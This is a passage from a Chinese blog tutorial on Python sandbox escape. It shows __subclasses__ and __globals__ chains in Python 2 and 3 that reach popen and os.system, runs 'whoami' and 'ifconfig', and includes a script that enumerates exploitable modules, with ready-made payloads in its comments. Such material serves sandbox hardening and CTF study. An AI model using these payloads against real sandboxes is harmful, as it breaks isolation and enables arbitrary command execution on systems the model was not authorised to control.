class="string">b'\x1b[0m'</span>, <span class="string">b'_'</span>: <span class="string">b'/usr/bin/python3'</span>}), <span class="string">'getenvb'</span>: &lt;function getenvb at <span class="number">0x7fc7ef46d3a0</span>&gt;, <span class="string">'fsencode'</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsencode at <span class="number">0x7fc7ef46d4c0</span>&gt;, <span class="string">'fsdecode'</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsdecode at <span class="number">0x7fc7ef46d550</span>&gt;, <span class="string">'P_WAIT'</span>: <span class="number">0</span>, <span class="string">'P_NOWAIT'</span>: <span class="number">1</span>, <span class="string">'P_NOWAITO'</span>: <span class="number">1</span>, <span class="string">'_spawnvef'</span>: &lt;function _spawnvef at <span class="number">0x7fc7ef46d430</span>&gt;, <span class="string">'spawnv'</span>: &lt;function spawnv at <span class="number">0x7fc7ef46d5e0</span>&gt;, <span class="string">'spawnve'</span>: &lt;function spawnve at <span class="number">0x7fc7ef46d670</span>&gt;, <span class="string">'spawnvp'</span>: &lt;function spawnvp at <span class="number">0x7fc7ef46d700</span>&gt;, <span class="string">'spawnvpe'</span>: &lt;function spawnvpe at <span class="number">0x7fc7ef46d790</span>&gt;, <span class="string">'spawnl'</span>: &lt;function spawnl at <span class="number">0x7fc7ef46d820</span>&gt;, <span class="string">'spawnle'</span>: &lt;function spawnle at <span class="number">0x7fc7ef46d8b0</span>&gt;, <span class="string">'spawnlp'</span>: &lt;function spawnlp at <span class="number">0x7fc7ef46d940</span>&gt;, <span class="string">'spawnlpe'</span>: &lt;function spawnlpe at <span class="number">0x7fc7ef46d9d0</span>&gt;, <span class="string">'popen'</span>: &lt;function popen at <span class="number">0x7fc7ef46da60</span>&gt;, <span class="string">'_wrap_close'</span>: &lt;<span class="keyword">class</span> <span class="string">'os._wrap_close'</span>&gt;, <span class="string">'fdopen'</span>: &lt;function fdopen at <span class="number">0x7fc7ef46daf0</span>&gt;, <span class="string">'_fspath'</span>: &lt;function _fspath at <span class="number">0x7fc7ef46dee0</span>&gt;, <span class="string">'PathLike'</span>: &lt;<span class="keyword">class</span> <span class="string">'os.PathLike'</span>&gt;}</span><br></pre></td></tr></tbody></table></figure>
<p>找到popen函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">"ifconfig"</span>).read()</span><br><span class="line"><span class="string">'eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.18.69.174  netmask 255.255.248.0  broadcast 10.18.71.255\n        inet6 fe80::20c:29ff:fe7d:da26  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:0c:29:7d:da:26  txqueuelen 1000  (Ethernet)\n        RX packets 16954  bytes 8157718 (7.7 MiB)\n        RX errors 0  dropped 1538  overruns 0  frame 0\n        TX packets 5464  bytes 503024 (491.2 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 187  bytes 17050 (16.6 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 187  bytes 17050 (16.6 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n'</span></span><br></pre></td></tr></tbody></table></figure>
<p>如果是python2那么还是用这个方法找</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>([].__class__.__bases__[<span class="number">0</span>].__subclasses__()): </span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">'type'</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">'weakref'</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">'weakcallableproxy'</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">'weakproxy'</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">'int'</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">'basestring'</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">'bytearray'</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">'list'</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">'NoneType'</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">'NotImplementedType'</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">'traceback'</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">'super'</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">'xrange'</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">'dict'</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">'set'</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">'slice'</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">'staticmethod'</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">'complex'</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">'float'</span>&gt;)</span><br><span class="line">(<span class="number">19</span>, &lt;<span class="built_in">type</span> <span class="string">'buffer'</span>&gt;)</span><br><span class="line">(<span class="number">20</span>, &lt;<span class="built_in">type</span> <span class="string">'long'</span>&gt;)</span><br><span class="line">(<span class="number">21</span>, &lt;<span class="built_in">type</span> <span class="string">'frozenset'</span>&gt;)</span><br><span class="line">(<span class="number">22</span>, &lt;<span class="built_in">type</span> <span class="string">'property'</span>&gt;)</span><br><span class="line">(<span class="number">23</span>, &lt;<span class="built_in">type</span> <span class="string">'memoryview'</span>&gt;)</span><br><span class="line">(<span class="number">24</span>, &lt;<span class="built_in">type</span> <span class="string">'tuple'</span>&gt;)</span><br><span class="line">(<span class="number">25</span>, &lt;<span class="built_in">type</span> <span class="string">'enumerate'</span>&gt;)</span><br><span class="line">(<span class="number">26</span>, &lt;<span class="built_in">type</span> <span class="string">'reversed'</span>&gt;)</span><br><span class="line">(<span class="number">27</span>, &lt;<span class="built_in">type</span> <span class="string">'code'</span>&gt;)</span><br><span class="line">(<span class="number">28</span>, &lt;<span class="built_in">type</span> <span class="string">'frame'</span>&gt;)</span><br><span class="line">(<span class="number">29</span>, &lt;<span class="built_in">type</span> <span class="string">'builtin_function_or_method'</span>&gt;)</span><br><span class="line">(<span class="number">30</span>, &lt;<span class="built_in">type</span> <span class="string">'instancemethod'</span>&gt;)</span><br><span class="line">(<span class="number">31</span>, &lt;<span class="built_in">type</span> <span class="string">'function'</span>&gt;)</span><br><span class="line">(<span class="number">32</span>, &lt;<span class="built_in">type</span> <span class="string">'classobj'</span>&gt;)</span><br><span class="line">(<span class="number">33</span>, &lt;<span class="built_in">type</span> <span class="string">'dictproxy'</span>&gt;)</span><br><span class="line">(<span class="number">34</span>, &lt;<span class="built_in">type</span> <span class="string">'generator'</span>&gt;)</span><br><span class="line">(<span class="number">35</span>, &lt;<span class="built_in">type</span> <span class="string">'getset_descriptor'</span>&gt;)</span><br><span class="line">(<span class="number">36</span>, &lt;<span class="built_in">type</span> <span class="string">'wrapper_descriptor'</span>&gt;)</span><br><span class="line">(<span class="number">37</span>, &lt;<span class="built_in">type</span> <span class="string">'instance'</span>&gt;)</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">'ellipsis'</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">'member_descriptor'</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">'file'</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">'PyCapsule'</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">'cell'</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">'callable-iterator'</span>&gt;)</span><br><span class="line">(<span class="number">44</span>, &lt;<span class="built_in">type</span> <span class="string">'iterator'</span>&gt;)</span><br><span class="line">(<span class="number">45</span>, &lt;<span class="built_in">type</span> <span class="string">'sys.long_info'</span>&gt;)</span><br><span class="line">(<span class="number">46</span>, &lt;<span class="built_in">type</span> <span class="string">'sys.float_info'</span>&gt;)</span><br><span class="line">(<span class="number">47</span>, &lt;<span class="built_in">type</span> <span class="string">'EncodingMap'</span>&gt;)</span><br><span class="line">(<span class="number">48</span>, &lt;<span class="built_in">type</span> <span class="string">'fieldnameiterator'</span>&gt;)</span><br><span class="line">(<span class="number">49</span>, &lt;<span class="built_in">type</span> <span class="string">'formatteriterator'</span>&gt;)</span><br><span class="line">(<span class="number">50</span>, &lt;<span class="built_in">type</span> <span class="string">'sys.version_info'</span>&gt;)</span><br><span class="line">(<span class="number">51</span>, &lt;<span class="built_in">type</span> <span class="string">'sys.flags'</span>&gt;)</span><br><span class="line">(<span class="number">52</span>, &lt;<span class="built_in">type</span> <span class="string">'exceptions.BaseException'</span>&gt;)</span><br><span class="line">(<span class="number">53</span>, &lt;<span class="built_in">type</span> <span class="string">'module'</span>&gt;)</span><br><span class="line">(<span class="number">54</span>, &lt;<span class="built_in">type</span> <span class="string">'imp.NullImporter'</span>&gt;)</span><br><span class="line">(<span class="number">55</span>, &lt;<span class="built_in">type</span> <span class="string">'zipimport.zipimporter'</span>&gt;)</span><br><span class="line">(<span class="number">56</span>, &lt;<span class="built_in">type</span> <span class="string">'posix.stat_result'</span>&gt;)</span><br><span class="line">(<span class="number">57</span>, &lt;<span class="built_in">type</span> <span class="string">'posix.statvfs_result'</span>&gt;)</span><br><span class="line">(<span class="number">58</span>, &lt;<span class="keyword">class</span> <span class="string">'warnings.WarningMessage'</span>&gt;)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">'warnings.catch_warnings'</span>&gt;)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">'_weakrefset._IterationGuard'</span>&gt;)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">'_weakrefset.WeakSet'</span>&gt;)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">'_abcoll.Hashable'</span>&gt;)</span><br><span class="line">(<span class="number">63</span>, &lt;<span class="built_in">type</span> <span class="string">'classmethod'</span>&gt;)</span><br><span class="line">(<span class="number">64</span>, &lt;<span class="keyword">class</span> <span class="string">'_abcoll.Iterable'</span>&gt;)</span><br><span class="line">(<span class="number">65</span>, &lt;<span class="keyword">class</span> <span class="string">'_abcoll.Sized'</span>&gt;)</span><br><span class="line">(<span class="number">66</span>, &lt;<span class="keyword">class</span> <span class="string">'_abcoll.Container'</span>&gt;)</span><br><span class="line">(<span class="number">67</span>, &lt;<span class="keyword">class</span> <span class="string">'_abcoll.Callable'</span>&gt;)</span><br><span class="line">(<span class="number">68</span>, &lt;<span class="built_in">type</span> <span class="string">'dict_keys'</span>&gt;)</span><br><span class="line">(<span class="number">69</span>, &lt;<span class="built_in">type</span> <span class="string">'dict_items'</span>&gt;)</span><br><span class="line">(<span class="number">70</span>, &lt;<span class="built_in">type</span> <span class="string">'dict_values'</span>&gt;)</span><br><span class="line">(<span class="number">71</span>, &lt;<span class="keyword">class</span> <span class="string">'site._Printer'</span>&gt;)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">'site._Helper'</span>&gt;)</span><br><span class="line">(<span class="number">73</span>, &lt;<span class="built_in">type</span> <span class="string">'_sre.SRE_Pattern'</span>&gt;)</span><br><span class="line">(<span class="number">74</span>, &lt;<span class="built_in">type</span> <span class="string">'_sre.SRE_Match'</span>&gt;)</span><br><span class="line">(<span class="number">75</span>, &lt;<span class="built_in">type</span> <span class="string">'_sre.SRE_Scanner'</span>&gt;)</span><br><span class="line">(<span class="number">76</span>, &lt;<span class="keyword">class</span> <span class="string">'site.Quitter'</span>&gt;)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">'codecs.IncrementalEncoder'</span>&gt;)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">'codecs.IncrementalDecoder'</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].os.system(<span class="string">'whoami'</span>)</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure>
<p>我们直接看下python2中的逻辑</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/warnings.py</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到导入了3个包</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> types</span><br></pre></td></tr></tbody></table></figure>
<p>然后再接着看</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/linecache.py</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到导入了2个包</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></tbody></table></figure>
<p>那么久可以构成了这个代码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].os.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<h4 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h4><p>首先去Python的GitHub主页，找到所有的模块列表：</p>
<pre><code>Python2.7：https://github.com/python/cpython/tree/2.7/Lib
Python3.8：https://github.com/python/cpython/tree/3.8/Lib
</code></pre>
<p>通过脚本进行筛选，执行方式看代码注释</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2022-09-22 13:30:58</span></span><br><span class="line"><span class="comment"># @Author  : ascotbe (ascotbe@gmail.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://www.ascotbe.com/</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_name</span>(<span class="params">url</span>):</span><br><span class="line">    file_name=[]</span><br><span class="line">    file_name_txt=<span class="string">""</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.json():</span><br><span class="line">        file_name.append(i[<span class="string">'name'</span>])</span><br><span class="line">        file_name_txt+=i[<span class="string">'name'</span>]+<span class="string">"\n"</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">"python.txt"</span>,<span class="string">"w"</span>).write(file_name_txt)</span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">'python.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        modules = f.readlines()</span><br><span class="line">    modules = [m.strip().replace(<span class="string">'.py'</span>, <span class="string">''</span>) <span class="keyword">for</span> m <span class="keyword">in</span> modules]</span><br><span class="line">    target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'commands'</span>]</span><br><span class="line">    target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'codecs'</span>]</span><br><span class="line">    all_targets = target_modules + target_functions</span><br><span class="line">    results = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> modules:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = <span class="built_in">__import__</span>(m)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'ERROR:'</span>, m)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">in</span> module.__dict__:</span><br><span class="line">                results[m.encode()].append(t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"可利用模块数量为:"</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(results)))</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">        <span class="built_in">print</span>(k, v)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python2</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">    target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------1-----------'</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------2-----------'</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------3-----------'</span>)</span><br><span class="line">    <span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------4-----------'</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line">    <span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span 